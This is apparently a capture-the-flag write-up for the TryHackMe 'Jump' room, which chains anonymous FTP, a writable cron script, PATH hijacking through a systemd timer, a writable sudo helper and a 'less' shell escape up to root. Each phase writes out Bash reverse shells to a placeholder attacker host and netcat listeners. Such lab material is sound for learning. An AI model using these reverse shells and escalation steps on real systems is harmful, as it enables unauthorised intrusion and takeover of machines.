# Jump

> [!WARNING]
> This writeup contains the full exploitation methodology for the **Jump** TryHackMe room.
>
> To preserve the learning experience for others, all flags have been redacted as `THM{REDACTED}`.

> [!NOTE]
> Throughout this writeup, the following placeholders are used:
>
> - `$TARGET_IP` — the TryHackMe target machine
> - `$ATTACKER_IP` — my attacking machine
---

## Room Information

| Category | Value |
|----------|-------|
| Platform | TryHackMe |
| Room | Jump |
| Operating System | Linux |
| Focus | Linux Privilege Escalation |

---

## Skills Practiced

- Linux Enumeration
- FTP Enumeration
- Reverse Shells
- Cron Job Abuse
- Weak File Permissions
- PATH Hijacking
- Systemd Timers
- Sudo Misconfigurations
- GTFOBins
- TTY Upgrades

---

## What I Learned

This room was an excellent demonstration of how multiple small Linux misconfigurations can be chained together into a complete privilege escalation path. None of the individual vulnerabilities were particularly dangerous on their own, but together they allowed an attacker to move from anonymous access all the way to **root**.

The biggest lesson I took away was the importance of thorough enumeration. Every privilege escalation relied on discovering something that appeared insignificant at first—a writable cron script, an unsafe `PATH`, or an overly permissive `sudo` rule. Missing any one of these would have stopped the attack chain entirely.

---

# Walkthrough

<details>
<summary><strong>Phase 0 – Reconnaissance</strong></summary>

## Objective

Identify exposed services and determine a possible initial attack vector.

### Port Scan

```bash
nmap -sC -sV -p- $TARGET_IP
```

### Results

| Port | Service | Notes |
|------|----------|------|
| 21 | FTP (vsftpd 3.0.5) | Anonymous login enabled |
| 22 | SSH | Credentials required |

Logging into FTP anonymously revealed a file named `README.txt`.

Contents:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This immediately suggested that files uploaded into the `incoming/` directory would be processed automatically.

That would become our initial foothold.

### Key Takeaways

- Always inspect exposed services.
- Anonymous FTP often leaks sensitive information.
- Automated processing pipelines can become arbitrary code execution vectors.

</details>

---

<details>
<summary><strong>Phase 1 – Initial Access (recon_user)</strong></summary>

## Objective

Gain code execution through the automated FTP processing pipeline.

### Reverse Shell

Create a Bash reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
```

Save the script as:

```text
payload.sh
```

Upload it through FTP:

```bash
ftp $TARGET_IP

Name: anonymous
Password:

cd incoming
put payload.sh
quit
```

The processor specifically executes files ending in `.sh`, so using the correct extension is essential.

### Start a Listener

```bash
nc -lvnp 4444
```

Shortly afterwards:

```text
connect to [$ATTACKER_IP] from [$TARGET_IP]

recon_user@tryhackme-2404:~$
```

We now have a shell as **recon_user**.

Retrieve the user flag:

```bash
cat /home/recon_user/flag.txt
```

```text
THM{REDACTED}
```

## Why This Worked

The FTP service automatically executes uploaded shell scripts.

Since our uploaded file contained a reverse shell, the processing service unknowingly connected back to our listener and executed commands under the **recon_user** account.

### Key Takeaways

- Reverse shells
- Automated task abuse
- Anonymous FTP exploitation

</details>

---

<details>
<summary><strong>Phase 2 – Privilege Escalation → dev_user</strong></summary>

## Objective

Escalate from **recon_user** to **dev_user**.

### Enumeration

Check group memberships:

```bash
id
```

Output:

```text
uid=1001(recon_user)
gid=1001(recon_user)

groups=1001(recon_user),1002(dev_user),1005(devops)
```

Interesting...

Our user belongs to the **dev_user** group.

Searching for writable files eventually reveals:

```bash
ls -la /opt/dev/backup.sh
```

Output:

```text
-rwxrwxr-x 1 dev_user dev_user 60 Jun 9 09:03 backup.sh
```

The script is:

- owned by **dev_user**
- group writable
- executed automatically every minute via cron

Current contents:

```bash
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user
```

### Exploitation

Append a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4445 0>&1' >> /opt/dev/backup.sh
```

Start another listener:

```bash
nc -lvnp 4445
```

Wait for cron to execute.

Connection received:

```text
dev_user@tryhackme-2404:~$
```

Retrieve the flag:

```bash
cat /home/dev_user/flag.txt
```

```text
THM{REDACTED}
```

## Why This Worked

Because **recon_user** belonged to the **dev_user** group, it could modify a script that cron later executed as **dev_user**.

When cron ran the modified script, our injected reverse shell executed with elevated privileges.

### Key Takeaways

- Linux group permissions
- Writable cron jobs
- Privilege escalation through scheduled tasks

</details>

---

<details>
<summary><strong>Phase 3 – Privilege Escalation → monitor_user</strong></summary>

## Objective

Escalate from **dev_user** to **monitor_user**.

### Enumeration

During enumeration, a **systemd timer** was discovered:

```text
healthcheck.timer
```

This timer periodically executes:

```text
healthcheck.service
```

The service runs the following script:

```bash
#!/bin/bash

echo "Running as: $(whoami)"

while true; do
    ps aux | grep -v grep
    sleep 5
done
```

The service environment contains the following `PATH`:

```text
PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
```

Notice that `/opt/dev/bin` appears **before** `/usr/bin`.

Anything placed inside `/opt/dev/bin` with the same name as a legitimate executable will be executed first.

Inspecting that directory revealed a writable file named:

```text
/opt/dev/bin/ps
```

This immediately suggested a classic **PATH hijacking** opportunity.

---

### Exploitation

Overwrite `ps` with a reverse shell:

```bash
echo '#!/bin/bash' > /opt/dev/bin/ps
echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4447 0>&1' >> /opt/dev/bin/ps

chmod +x /opt/dev/bin/ps
```

Start another listener:

```bash
nc -lvnp 4447
```

Once the timer executed again, a new shell connected back:

```text
monitor_user@tryhackme-2404:~$
```

Retrieve the flag:

```bash
cat /home/monitor_user/flag.txt
```

```text
THM{REDACTED}
```

---

## Why This Worked

The service executes:

```bash
ps
```

rather than

```bash
/usr/bin/ps
```

Because `/opt/dev/bin` appears first in the `PATH`, Linux executes our malicious version instead of the legitimate binary.

Since the service itself runs as **monitor_user**, our payload inherits those privileges.

---

### Key Takeaways

- PATH Hijacking
- Systemd Timers
- Search Order Precedence
- Writable Directories in PATH

</details>

---

<details>
<summary><strong>Phase 4 – Privilege Escalation → ops_user</strong></summary>

## Objective

Escalate from **monitor_user** to **ops_user**.

### Enumeration

Check available sudo permissions:

```bash
sudo -l
```

Output:

```text
User monitor_user may run the following commands on tryhackme-2404:

(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Inspect the privileged script:

```bash
#!/bin/bash

cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The helper script is owned by **monitor_user**:

```text
-rwxr-xr-x 1 monitor_user monitor_user deploy_helper.sh
```

Meaning we can modify it before it's executed by the privileged wrapper.

---

### Exploitation

Overwrite the helper script:

```bash
echo '#!/bin/bash' > /opt/app/deploy_helper.sh

echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4448 0>&1' >> /opt/app/deploy_helper.sh
```

Execute the privileged wrapper:

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

Listener:

```bash
nc -lvnp 4448
```

Connection received:

```text
ops_user@tryhackme-2404:/opt/app$
```

Retrieve the flag:

```bash
cat /home/ops_user/flag.txt
```

```text
THM{REDACTED}
```

---

## Why This Worked

Although `deploy.sh` itself wasn't writable, it trusted another script that **was**.

Because the helper script executes under **ops_user**, replacing its contents allowed arbitrary command execution with elevated privileges.

---

### Key Takeaways

- Sudo Enumeration
- Script Chaining
- Writable Helper Scripts
- Privilege Escalation via Trusted Scripts

</details>

---

<details>
<summary><strong>Phase 5 – Privilege Escalation → root</strong></summary>

## Objective

Obtain root privileges.

### Enumeration

Once again, inspect sudo permissions:

```bash
sudo -l
```

Output:

```text
User ops_user may run the following commands:

(root) NOPASSWD: /usr/bin/less
```

At first glance this doesn't seem dangerous.

However, `less` is part of **GTFOBins** and supports shell escapes.

---

### Upgrade the Shell

Reverse shells often lack a proper interactive terminal.

Upgrade it using:

```bash
script /dev/null -c bash
```

Alternatively:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

A proper TTY ensures interactive programs like `less` behave correctly.

---

### Exploitation

Run:

```bash
sudo /usr/bin/less /etc/hosts
```

Inside the viewer, type:

```text
!/bin/bash
```

This spawns:

```text
root@tryhackme-2404#
```

Retrieve the final flag:

```bash
cat /root/flag.txt
```

```text
THM{REDACTED}
```

---

## Why This Worked

The `!` command inside **less** executes arbitrary shell commands.

Since `less` itself was running as **root**, every spawned command also executes as **root**.

This is one of the classic privilege escalation techniques documented by **GTFOBins**.

---

### Key Takeaways

- GTFOBins
- Sudo Abuse
- Interactive Shell Escapes
- TTY Upgrades

</details>
